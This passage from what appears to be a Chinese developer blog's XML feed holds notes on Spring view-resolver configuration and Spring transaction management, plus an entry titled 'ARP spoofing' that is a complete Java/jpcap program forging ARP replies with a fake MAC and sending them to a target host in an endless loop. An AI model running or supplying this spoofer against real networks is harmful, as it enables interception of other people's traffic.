punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html;charset<span class="token punctuation">=</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewNames<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>*.html<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>suffix<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>dateToolAttribute<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>date<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>numberToolAttribute<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>number<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>toolboxConfigLocation<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/WEB-INF/velocity-toolbox.xml<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token comment" spellcheck="true">&lt;!--是否使用spring对宏定义的支持--></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>exposeRequestAttributes<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>requestContextAttribute<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rc<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>order<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>velocityConfigurer<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.springframework.web.servlet.view.velocity.VelocityConfigurer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>resourceLoaderPath<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/WEB-INF/page/<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>velocityProperties<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>props</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>prop</span> <span class="token attr-name">key</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>input.encoding<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>UTF-8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>prop</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>prop</span> <span class="token attr-name">key</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>output.encoding<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>UTF-8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>prop</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>prop</span> <span class="token attr-name">key</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>contentType<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>text/html;charset=UTF-8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>prop</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>props</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- JSP视图解析器  --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewResolverJsp<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.springframework.web.servlet.view.InternalResourceViewResolver<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>prefix<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/WEB-INF/page/<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>suffix<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>.jsp<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- FreeMarker视图解析器 --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewResolver<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.springframework.web.servlet.view.freemarker.FreeMarkerViewResolver<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewClass<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.springframework.web.servlet.view.freemarker.FreeMarkerView<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>contentType<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html; charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>cache<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>false<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewNames<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>*.ftl<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>suffix<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>order<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后端 </tag>
            
            <tag> spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>arp欺骗</title>
      <link href="/2020/09/14/arp-qi-pian/"/>
      <url>/2020/09/14/arp-qi-pian/</url>
      
        <content type="html"><![CDATA[<pre><code>package com.test.arp;import java.net.InetAddress;import jpcap.JpcapCaptor;import jpcap.JpcapSender;import jpcap.NetworkInterface;import jpcap.packet.ARPPacket;import jpcap.packet.EthernetPacket;public class SendFakeARP {    static byte[] stomac(String s) {        byte[] mac = new byte[] { (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00 };        String[] s1 = s.split(&quot;-&quot;);        for (int x = 0; x &lt; s1.length; x++) {            mac[x] = (byte) ((Integer.parseInt(s1[x], 16)) &amp; 0xff);        }        return mac;    }    public static void main(String[] args) throws Exception {        int time = 2;  // 重发间隔时间        InetAddress desip = InetAddress.getByName(&quot;192.168.1.2&quot;);// 被欺骗的目标IP地址        byte[] desmac = stomac(&quot;01-1c-23-3c-51-cf&quot;);// 被欺骗的目标目标MAC数组        InetAddress srcip = InetAddress.getByName(&quot;192.168.1.3&quot;);// 源IP地址        byte[] srcmac = stomac(&quot;00-1C-13-2E-A8-0A&quot;); // 假的MAC数组        // 枚举网卡并打开设备        NetworkInterface[] devices = JpcapCaptor.getDeviceList();        NetworkInterface device = devices[1];        JpcapSender sender = JpcapSender.openDevice(device);        // 设置ARP包        ARPPacket arp = new ARPPacket();        arp.hardtype = ARPPacket.HARDTYPE_ETHER;        arp.prototype = ARPPacket.PROTOTYPE_IP;        arp.operation = ARPPacket.ARP_REPLY;        arp.hlen = 6;        arp.plen = 4;        arp.sender_hardaddr = srcmac;        arp.sender_protoaddr = srcip.getAddress();        arp.target_hardaddr = desmac;        arp.target_protoaddr = desip.getAddress();        // 设置DLC帧        EthernetPacket ether = new EthernetPacket();        ether.frametype = EthernetPacket.ETHERTYPE_ARP;        ether.src_mac = srcmac;        ether.dst_mac = desmac;        arp.datalink = ether;        // 发送ARP应答包        while (true) {            System.out.println(&quot;sending arp..&quot;);            sender.sendPacket(arp);            Thread.sleep(time * 1000);        }    }}</code></pre>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技能 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>spring事务管理</title>
      <link href="/2020/09/12/spring-shi-wu-guan-li/"/>
      <url>/2020/09/12/spring-shi-wu-guan-li/</url>
      
        <content type="html"><![CDATA[<h3 id="一、事务定义与概念"><a href="#一、事务定义与概念" class="headerlink" title="一、事务定义与概念"></a>一、事务定义与概念</h3><h4 id="1、事务的定义"><a href="#1、事务的定义" class="headerlink" title="1、事务的定义"></a>1、事务的定义</h4><p>（1）事务是数据库操作最基本单元，逻辑上一组操作，要么都成功，如果有一个失败所有操作都失败。</p><p>（2）典型场景：银行转账</p><p>* lucy 转账 100 元 给 mary</p><p>* lucy 少 100，mary 多 100</p><h4 id="2、事务的四大特性（ACID）"><a href="#2、事务的四大特性（ACID）" class="headerlink" title="2、事务的四大特性（ACID）"></a>2、事务的四大特性（ACID）</h4><p><strong>原子性（Atomicity）</strong>：事务是一个原子操作，由一系列动作组成。事务的原子性确保动作要么全部完成，要么完全不起作用。<br><strong>一致性（Consistency）</strong>：一旦事务完成（不管成功还是失败），系统必须确保它所建模的业务处于一致的状态，而不会是部分完成部分失败。在现实中的数据不应该被破坏。<br><strong>隔离性（Isolation）</strong>：可能有许多事务会同时处理相同的数据，因此每个事务都应该与其他事务隔离开来，防止数据损坏。<br><strong>持久性（Durability）</strong>：一旦事务完成，无论发生什么系统错误，它的结果都不应该受到影响，这样就能从任何系统崩溃中恢复过来。通常情况下，事务的结果被写到持久化存储器中。</p><h4 id="3、Spring事务管理"><a href="#3、Spring事务管理" class="headerlink" title="3、Spring事务管理"></a>3、Spring事务管理</h4><h5 id="（1）编程式事务管理"><a href="#（1）编程式事务管理" class="headerlink" title="（1）编程式事务管理"></a>（1）编程式事务管理</h5><p>编程式事务管理是侵入性事务管理，使用TransactionTemplate或者直接使用PlatformTransactionManager，对于编程式事务管理，Spring推荐使用TransactionTemplate。</p><h5 id="（2）声明式事务管理"><a href="#（2）声明式事务管理" class="headerlink" title="（2）声明式事务管理"></a>（2）声明式事务管理</h5><p>声明式事务管理建立在AOP之上，其本质是对方法前后进行拦截，然后在目标方法开始之前创建或者加入一个事务，执行完目标方法之后根据执行的情况提交或者回滚。编程式事务每次实现都要单独实现，但业务量大功能复杂时，使用编程式事务无疑是痛苦的，而声明式事务不同，声明式事务属于无侵入式，不会影响业务逻辑的实现，只需要在配置文件中做相关的事务规则声明或者通过注解的方式，便可以将事务规则应用到业务逻辑中。</p><p>显然声明式事务管理要优于编程式事务管理，这正是Spring倡导的非侵入式的编程方式。唯一不足的地方就是声明式事务管理的粒度是方法级别，而编程式事务管理是可以到代码块的，但是可以通过提取方法的方式完成声明式事务管理的配置。</p><h4 id="4、搭建事务操作环境"><a href="#4、搭建事务操作环境" class="headerlink" title="4、搭建事务操作环境"></a>4、搭建事务操作环境</h4><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Repository</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserDaoImpl</span> <span class="token keyword">implements</span> <span class="token class-name">UserDao</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> JdbcTemplate jdbcTemplate<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//lucy 转账 100 给mary </span><span class="token comment" spellcheck="true">//少钱 </span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">reduceMoney</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        String sql <span class="token operator">=</span> <span class="token string">"update t_account set money=money-? where username=?"</span><span class="token punctuation">;</span>        jdbcTemplate<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>sql<span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token string">"lucy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//多钱 </span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addMoney</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        String sql <span class="token operator">=</span> <span class="token string">"update t_account set money=money+? where username=?"</span><span class="token punctuation">;</span>        jdbcTemplate<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>sql<span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token string">"mary"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token annotation punctuation">@Service</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserService</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//注入 dao </span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> UserDao userDao<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//转账的方法 </span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">accountMoney</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//lucy 少 100 </span>        userDao<span class="token punctuation">.</span><span class="token function">reduceMoney</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//模拟异常</span>      <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">10</span><span class="token operator">/</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//mary 多 100 </span>        userDao<span class="token punctuation">.</span><span class="token function">addMoney</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> </code></pre><p>问：上面的问题如何解决呢？<br> 答：使用事务解决问题</p><p><strong>事务操作过程：</strong></p><p>事务添加到 JavaEE 三层结构里面 Service 层（业务逻辑层）</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Service</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserService</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//注入 dao </span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> UserDao userDao<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//转账的方法 </span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">accountMoney</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span><span class="token punctuation">{</span>               <span class="token comment" spellcheck="true">//第一步 开启事物</span>            <span class="token comment" spellcheck="true">//第二步 进行业务操作</span>            <span class="token comment" spellcheck="true">//lucy 少 100 </span>            userDao<span class="token punctuation">.</span><span class="token function">reduceMoney</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//模拟异常</span>            <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">10</span><span class="token operator">/</span><span class="token number">0</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//mary 多 100 </span>            userDao<span class="token punctuation">.</span><span class="token function">addMoney</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//第三步 没有发生异常，提交事物</span>            <span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>Exception e<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//第四步 出现异常，事物回滚</span>            <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> </code></pre><h3 id="二、Spring-事务管理"><a href="#二、Spring-事务管理" class="headerlink" title="二、Spring 事务管理"></a>二、<strong>Spring</strong> <strong>事务管理</strong></h3><p>在 Spring 进行事务管理操作，有两种方式：编程式事务管理和声明式事务管理（使用）</p><h4 id="1、声明式事务管理的实现方式："><a href="#1、声明式事务管理的实现方式：" class="headerlink" title="1、声明式事务管理的实现方式："></a>1、声明式事务管理的实现方式：</h4><p>（1）基于注解方式（使用）<br> （2）基于xml配置方式</p><h4 id="2、在-Spring-进行声明式事务管理，底层使用-AOP-原理"><a href="#2、在-Spring-进行声明式事务管理，底层使用-AOP-原理" class="headerlink" title="2、在 Spring 进行声明式事务管理，底层使用 AOP 原理"></a>2、<strong>在</strong> <strong>Spring</strong> <strong>进行声明式事务管理，底层使用</strong> <strong>AOP</strong> <strong>原理</strong></h4><h4 id="3、Spring-事务管理-API"><a href="#3、Spring-事务管理-API" class="headerlink" title="3、Spring 事务管理 API"></a>3、<strong>Spring</strong> <strong>事务管理</strong> <strong>API</strong></h4><p>（1）提供一个接口，代表事务管理器，这个接口针对不同的框架提供不同的实现类(<strong>DataSourceTransactionManager</strong>)</p><h4 id="3、注解式事务管理操作"><a href="#3、注解式事务管理操作" class="headerlink" title="3、注解式事务管理操作"></a>3、注解式事务管理操作</h4><p>（1）在Spring配置文件中，添加事务管理器，并开启事务注解这里需要注意，开启事务注解需要使用名称空间tx</p><pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>  <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>  <span class="token attr-name"><span class="token namespace">xmlns:</span>context</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/context<span class="token punctuation">"</span></span>  <span class="token attr-name"><span class="token namespace">xmlns:</span>aop</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/aop<span class="token punctuation">"</span></span>  <span class="token attr-name"><span class="token namespace">xmlns:</span>tx</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/tx<span class="token punctuation">"</span></span>  <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd  http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd  http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd  http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre><pre class=" language-xml"><code class="language-xml"> <span class="token comment" spellcheck="true">&lt;!--创建事务管理器--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>transactionManager<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.springframework.jdbc.datasource.DataSourceTransactionManager<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token comment" spellcheck="true">&lt;!--注入数据源--></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>dataSource<span class="token punctuation">"</span></span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>dataSource<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!--开启事务注解--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">tx:</span>annotation-driven</span> <span class="token attr-name">transaction-manager</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>transactionManager<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></code></pre><p>(2)在 service 类上面（或者 service 类里面方法上面）添加事务注解</p><p>（1）@Transactional，这个注解添加到类上面，也可以添加方法上面</p><p>（2）如果把这个注解添加类上面，这个类里面所有的方法都添加事务</p><p>（3）如果把这个注解添加方法上面，为这个方法添加事务</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Service</span><span class="token annotation punctuation">@Transactional</span> <span class="token comment" spellcheck="true">// 事务注解，类上面或者里面的方法上添加注解</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserService</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> UserDao userDao<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>在 service 类上面添加注解@Transactional，在这个注解里面可以配置事务相关参数</p><h3 id="三、事务的传播行为-propagation"><a href="#三、事务的传播行为-propagation" class="headerlink" title="三、事务的传播行为(propagation)"></a>三、事务的传播行为(propagation)</h3><p>事务的传播性一般用在事务嵌套的场景，比如一个事务方法里面调用了另外一个事务方法，那么两个方法是各自作为独立的方法提交还是内层的事务合并到外层的事务一起提交，这就是需要事务传播机制的配置来确定怎么样执行。</p><p><strong>事务的传播行为有以下七种：</strong></p><p><strong>PROPAGATION_REQUIRED</strong>：Spring默认的传播机制，能满足绝大部分业务需求，如果外层有事务，则当前事务加入到外层事务，一块提交，一块回滚。如果外层没有事务，新建一个事务执行</p><p><strong>PROPAGATION_REQUES_NEW</strong>：该事务传播机制是每次都会新开启一个事务，同时把外层事务挂起，当当前事务执行完毕，恢复上层事务的执行。如果外层没有事务，执行当前新开启的事务即可</p><p><strong>PROPAGATION_SUPPORT</strong>：如果外层有事务，则加入外层事务，如果外层没有事务，则直接使用非事务方式执行。完全依赖外层的事务<br><strong>PROPAGATION_NOT_SUPPORT</strong>该传播机制不支持事务，如果外层存在事务则挂起，执行完当前代码，则恢复外层事务，无论是否异常都不会回滚当前的代码</p><p><strong>PROPAGATION_NEVER</strong>：该传播机制不支持外层事务，即如果外层有事务就抛出异常</p><p><strong>PROPAGATION_MANDATORY</strong>：与NEVER相反，如果外层没有事务，则抛出异常</p><p><strong>PROPAGATION_NESTED</strong>该传播机制的特点是可以保存状态保存点，当前事务回滚到某一个点，从而避免所有的嵌套事务都回滚，即各自回滚各自的，如果子事务没有把异常吃掉，基本还是会引起全部回滚的。</p><p>传播规则回答了这样一个问题：一个新的事务应该被启动还是被挂起，或者是一个方法是否应该在事务性上下文中运行。</p><h3 id="四、事务的隔离级别"><a href="#四、事务的隔离级别" class="headerlink" title="四、事务的隔离级别"></a>四、事务的隔离级别</h3>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后端 </tag>
            
            <tag> spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>spring aop</title>
      <link href="/2020/09/09/spring-aop/"/>
      <url>/2020/09/09/spring-aop/</url>
      
